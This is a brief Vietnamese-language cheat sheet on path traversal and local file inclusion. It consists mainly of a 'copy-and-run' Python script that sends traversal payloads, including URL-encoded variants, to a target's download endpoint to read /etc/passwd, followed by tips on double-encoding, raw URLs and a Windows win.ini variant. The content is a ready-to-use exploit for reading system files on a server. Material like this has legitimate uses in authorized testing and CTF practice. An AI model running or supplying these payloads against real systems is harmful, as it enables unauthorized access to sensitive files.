# Path Traversal / LFI

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

payloads = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
]
for p in payloads:
    r = s.get(f"{base}/download", params={"file": p}, timeout=5)
    if "root:" in r.text:
        print("HIT", p)
        print(r.text[:200])
        break
    print(p, r.status_code, len(r.text))
```

## Lưu ý nhanh
- Thử cả raw path, URL-encoded, double-encoded nếu server decode nhiều tầng.
- Nếu `params=` làm encode khác ý, dùng raw URL hoặc `PreparedRequest`.
- Với Windows target, thử `..\\..\\windows\\win.ini`.